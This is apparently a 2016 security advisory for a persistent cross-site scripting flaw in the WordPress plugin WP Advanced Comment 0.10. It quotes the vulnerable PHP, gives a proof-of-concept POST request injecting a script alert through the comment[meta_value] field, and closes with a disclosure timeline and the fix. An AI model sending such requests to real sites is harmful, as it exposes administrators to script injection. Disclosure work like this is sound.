 
 
# Exploit Title: WordPress WP Advanced Comment 0.10 Persistent XSS 
# Date: Mar.09.2016 
# Exploit Author: Mohammad Khaleghi 
# Contact: https://twitter.com/_blackmatrix 
# Vendor: Ravi Shakya 
# Tested On: Apache2.2 / PHP5 / Kali 64 / WordPress 4.4.1 
# Category: Webapps 
 
 
 
2. Description
 
WP Advanced Comment 0.10 plugin does not have XSS protection, which means that an attacker can change the POST request , value of " name="comment[meta_value]" " parameter , it&#039;s not escaped . XSS is visible for admin
 
File : wp-content\plugins\wp-advance-comment\shortcodes\comment-form.php
 
 
<!-- Show Comments -->
 
<?php
 
    if( $option[$id][&#039;other&#039;][&#039;comment_position&#039;] == 1 ){
 
        echo $this->show_like_dislike_button( $value[&#039;comment_ID&#039;] , 
        $option[$id][&#039;other&#039;] , &#039;top&#039; );
 
        echo &#039;<p>&#039;.$value[&#039;comment_content&#039;].&#039;</p>&#039;;
 
        echo $this->show_like_dislike_button( $value[&#039;comment_ID&#039;] , 
        $option[$id][&#039;other&#039;] , &#039;bottom&#039; );
 
}?>
 
<!-- Get the comment meta -->     
 
<?php
 
    $data = get_option( &#039;wpad_comment_form&#039; );
 
    if( !empty( $data[$id] ) ): 
?>
 
<div class="wpad_comment_meta">
     <ul>
      <?php
      foreach( $data[$id] as $key => $value1 ){
      $show_admin = isset($value1[&#039;show_admin&#039;]) ? 
      $value1[&#039;show_admin&#039;] : 0; $privelage = $this->check_administrator( $show_admin );
  
          if ( !empty( $value1[&#039;meta_key&#039;] ) && is_numeric( $key ) && $value1[&#039;meta_key&#039;] != &#039;user_name&#039; && $value1
           [&#039;meta_key&#039;] != &#039;user_email&#039; && $value1[&#039;custom_field&#039;] != &#039;user_image&#039; && 
           $value1[&#039;meta_key&#039;] != &#039;wpad_comment&#039; && $privelage == true )  {
 
           $meta_key = $value1[&#039;meta_key&#039;];
           $label = $value1[&#039;label&#039;];
 
           $meta_value = get_comment_meta( $value[&#039;comment_ID&#039;] , 
           $meta_key , true ); if( !empty( $meta_value ) ) {
 
        if( $value1[&#039;custom_field&#039;] == &#039;radio&#039; ) {
 
            $radio_value = $this->get_corresponding_metakey( $value1 , $meta_value , &#039;radio&#039; ); 
            $this->display_comment_metas_frontend( $label , $radio_value );
            } 
            elseif ( $value1[&#039;custom_field&#039;] == &#039;checkbox&#039; ) {
 
               $check_value = $this->get_corresponding_metakey( $value1 , $meta_value , &#039;checkbox&#039;); 
               $this->display_comment_metas_frontend( $label , $check_value ); } 
            else {
                $this->display_comment_metas_frontend( $label , $meta_value );
                   }
 
            }
        }
    }
 
    ?>
    </ul>
            </div>
 
<?php endif; ?>
 
<!-- Show Comments -->
  
 
3. Proof of Concept
 
Request :
__________________________________________________________________________
 
Host=127.0.0.1:8080
User-Agent=Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.8.0
Accept=*/*
X-Requested-With=XMLHttpRequest
Content-Length=1399
Content-Type=multipart/form-data;
boundary=---------------------------23741051518289624461916684164
 
 
Connection=keep-alive
Pragma=no-cache
Cache-Control=no-cache
 
POSTDATA =-----------------------------23741051518289624461916684164
 
Content-Disposition: form-data; name="action"
 
wpad_save_comment
 
-----------------------------
 
23741051518289624461916684164 Content-Disposition: form-data; name="post_id"
  
 
1
 
-----------------------------
 
23741051518289624461916684164 Content-Disposition: form-data; name="form_id"
 
417
 
-----------------------------
23741051518289624461916684164 Content-Disposition: form-data; name="email_me_on_approve"
 
undefined
 
-----------------------------
23741051518289624461916684164 Content-Disposition: form-data; name="user_name[meta_value]"
 
bourne
 
-----------------------------
23741051518289624461916684164 Content-Disposition: form-data; name="user_name[meta_key]"
 
user_name
 
-----------------------------
23741051518289624461916684164 Content-Disposition: form-data; name="user_email[meta_value]"
 
jason_bourne110@yahoo.com
 
-----------------------------
 
23741051518289624461916684164 Content-Disposition: form-data; name="user_email[meta_key]"
 
user_email
 
-----------------------------
 
23741051518289624461916684164 Content-Disposition: form-data; name="comment[meta_value]"
 
Hack <script>alert("Hacked")</script>
 
-----------------------------
23741051518289624461916684164 Content-Disposition: form-data; name="comment[meta_key]"
 
comment
 
-----------------------------
23741051518289624461916684164--
  
 
Response
______________________________________________________________________
 
Status=OK - 200
Date=Sat, 06 Feb 2016 18:18:43 GMT 
Server=Apache X-Frame-Options=SAMEORIGIN, SAMEORIGIN X-Powered-By=PHP/5.5.29 X-Robots-Tag=noindex x-content-type-options=nosniff Expires=Wed, 11 Jan 1984 05:00:00 GMT
Cache-Control=no-cache, must-revalidate, max-age=0 Pragma=no-cache
Content-Length=7 
Keep-Alive=timeout=5, max=100 
Connection=Keep-Alive 
Content-Type=text/html; charset=UTF-8
 
 
 
4. Report Timeline
 
09-03-2016 : Discovered
09-03-2016 : Vendor notified
09-03-2016 : Vendor Responded 
09-03-2016 : Vendor fixed the problem
 
 
5. Solution
 
Update to version 0.11

